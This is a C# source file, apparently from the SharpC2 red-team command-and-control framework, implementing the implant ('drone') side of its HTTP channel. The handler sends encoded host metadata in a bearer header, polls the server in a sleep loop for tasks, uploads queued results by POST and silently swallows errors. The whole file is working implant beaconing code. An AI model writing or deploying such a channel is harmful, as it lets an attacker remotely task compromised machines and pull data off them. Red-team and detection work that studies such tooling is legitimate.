using System;
using System.Net;
using System.Threading.Tasks;

using Drone.Models;

namespace Drone.Handlers
{
    public class DefaultHttpHandler : Handler
    {
        public override string Name { get; } = "default-http";

        private WebClient _client;
        private bool _running;

        public override void Init(DroneConfig config, Metadata metadata)
        {
            base.Init(config, metadata);

            _client = new WebClient {BaseAddress = $"{HttpScheme}://{ConnectAddress}:{ConnectPort}"};
            _client.Headers.Clear();

            var encodedMetadata = Convert.ToBase64String(Metadata.Serialize());
            _client.Headers.Add("X-Malware", "SharpC2");
            _client.Headers.Add("Authorization", $"Bearer {encodedMetadata}");
        }

        public override async Task Start()
        {
            _running = true;

            while (_running)
            {
                try { await CheckIn(); }
                catch { /* pokemon */ }

                var interval = Config.GetConfig<int>("SleepInterval");
                await Task.Delay(interval * 1000);
            }
        }

        private async Task CheckIn()
        {
            if (OutboundQueue.IsEmpty) await SendGet();
            else await SendPost();
        }

        private async Task SendGet()
        {
            var response = await _client.DownloadDataTaskAsync("/");
            
            HandleResponse(response);
        }

        private async Task SendPost()
        {
            var data = GetOutboundQueue().Serialize();
            var response = await _client.UploadDataTaskAsync("/", data);
            
            HandleResponse(response);
        }

        private void HandleResponse(byte[] response)
        {
            if (response.Length == 0) return;

            var envelope = response.Deserialize<MessageEnvelope>();
            if (envelope is null) return;

            InboundQueue.Enqueue(envelope);
        }

        public override void Stop()
        {
            _running = false;
        }

        private static string HttpScheme => "http";
        private static string ConnectAddress => "localhost";
        private static string ConnectPort => "80";
    }
}